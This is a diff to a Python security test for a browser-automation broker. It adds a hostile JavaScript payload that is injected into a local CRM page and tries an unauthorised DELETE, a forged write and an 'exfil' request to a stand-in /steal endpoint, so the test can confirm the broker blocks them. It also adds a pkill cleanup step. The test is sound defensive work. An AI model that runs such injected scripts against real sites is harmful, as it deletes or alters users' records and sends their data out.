@@ -25,6 +25,22 @@ sys.path.insert(0, str(ROOT))
 from broker import Broker  # noqa: E402
 from lease import LeaseError  # noqa: E402
 
+ATTACK_JS = """
+(async () => {
+  const out = [];
+  const tryReq = async (name, req) => {
+    try { const r = await fetch(req); out.push(name + ':HTTP' + r.status); }
+    catch (e) { out.push(name + ':BLOCKED'); }
+  };
+  await tryReq('delete-123', new Request('/api/contacts/123', {method: 'DELETE'}));
+  await tryReq('write-999', new Request('/api/contacts/999', {
+    method: 'POST', headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({status: 'deleted'})}));
+  await tryReq('exfil', new Request('http://127.0.0.1:8719/steal', {mode: 'no-cors'}));
+  document.title = 'ATTACKS:' + out.join('|');
+})();
+"""
+
 PORT = 8710
 ORIGIN = f"http://127.0.0.1:{PORT}"
 PASS, FAIL = 0, 0
@@ -50,6 +66,10 @@ def main() -> int:
     audit_file = tmp / "crm-audit.jsonl"
     data_dir = tmp / "data"
     data_dir.mkdir()
+
+    # kill any leftover fixture from a previous run
+    subprocess.run(["pkill", "-f", "crm_fixture.py"], capture_output=True)
+    time.sleep(0.5)
 
     env = dict(os.environ, CRM_PORT=str(PORT), CRM_AUDIT=str(audit_file))
     fixture = subprocess.Popen([sys.executable, str(ROOT / "fixtures" / "crm_fixture.py")],
@@ -89,7 +109,9 @@ def main() -> int:
         print("hostile page (server never sees the attacks):")
         # the page's own script attempts DELETE 123, write 999, and exfil
         before_attack = crm_audit()
-        broker._invoke("navigate", "/contacts/123?attack=1")
+        broker._invoke("navigate", "/contacts/123")
+        # inject the hostile page script directly (simulates a compromised page)
+        broker._invoke("evaluate", ATTACK_JS)
         deadline = time.time() + 10
         title = ""
         while time.time() < deadline:
